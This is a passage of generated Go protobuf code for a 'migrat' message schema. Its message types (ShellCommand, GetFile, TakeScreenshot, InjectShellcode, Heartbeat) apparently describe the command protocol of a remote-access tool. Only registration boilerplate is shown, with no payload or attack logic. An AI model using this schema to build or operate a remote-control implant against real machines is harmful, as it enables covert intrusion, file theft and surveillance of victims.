var file_migrator_proto_goTypes = []interface{}{
	(*ShellCommand)(nil),         // 0: migrat.ShellCommand
	(*ShellResponse)(nil),        // 1: migrat.ShellResponse
	(*GetFile)(nil),              // 2: migrat.GetFile
	(*File)(nil),                 // 3: migrat.File
	(*HeartbeatResponse)(nil),    // 4: migrat.HeartbeatResponse
	(*Ident)(nil),                // 5: migrat.Ident
	(*TakeScreenshot)(nil),       // 6: migrat.TakeScreenshot
	(*Screenshot)(nil),           // 7: migrat.Screenshot
	(*GetDirectory)(nil),         // 8: migrat.GetDirectory
	(*FileInfo)(nil),             // 9: migrat.FileInfo
	(*GetDirectoryResponse)(nil), // 10: migrat.GetDirectoryResponse
	(*Interpret)(nil),            // 11: migrat.Interpret
	(*InterpretResponse)(nil),    // 12: migrat.InterpretResponse
	(*InjectShellcode)(nil),      // 13: migrat.InjectShellcode
}
var file_migrator_proto_depIdxs = []int32{
	9, // 0: migrat.GetDirectoryResponse.files:type_name -> migrat.FileInfo
	1, // [1:1] is the sub-list for method output_type
	1, // [1:1] is the sub-list for method input_type
	1, // [1:1] is the sub-list for extension type_name
	1, // [1:1] is the sub-list for extension extendee
	0, // [0:1] is the sub-list for field type_name
}

func init() { file_migrator_proto_init() }
func file_migrator_proto_init() {
	if File_migrator_proto != nil {
		return
	}
	if !protoimpl.UnsafeEnabled {
		file_migrator_proto_msgTypes[0].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*ShellCommand); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[1].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*ShellResponse); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[2].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*GetFile); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[3].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*File); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[4].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*HeartbeatResponse); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[5].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*Ident); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[6].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*TakeScreenshot); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[7].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*Screenshot); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[8].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*GetDirectory); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[9].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*FileInfo); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[10].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*GetDirectoryResponse); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[11].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*Interpret); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[12].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*InterpretResponse); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
		file_migrator_proto_msgTypes[13].Exporter = func(v interface{}, i int) interface{} {
			switch v := v.(*InjectShellcode); i {
			case 0:
				return &v.state
			case 1:
				return &v.sizeCache
			case 2:
				return &v.unknownFields
			default:
				return nil
			}
		}
	}
	type x struct{}
	out := protoimpl.TypeBuilder{
		File: protoimpl.DescBuilder{
			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
			RawDescriptor: file_migrator_proto_rawDesc,
			NumEnums:      0,
			NumMessages:   14,
			NumExtensions: 0,
			NumServices:   0,
		},
		GoTypes:           file_migrator_proto_goTypes,
		DependencyIndexes: file_migrator_proto_depIdxs,
		MessageInfos:      file_migrator_proto_msgTypes,
	}.Build()
	File_migrator_proto = out.File
	file_migrator_proto_rawDesc = nil
	file_migrator_proto_goTypes = nil
	file_migrator_proto_depIdxs = nil
}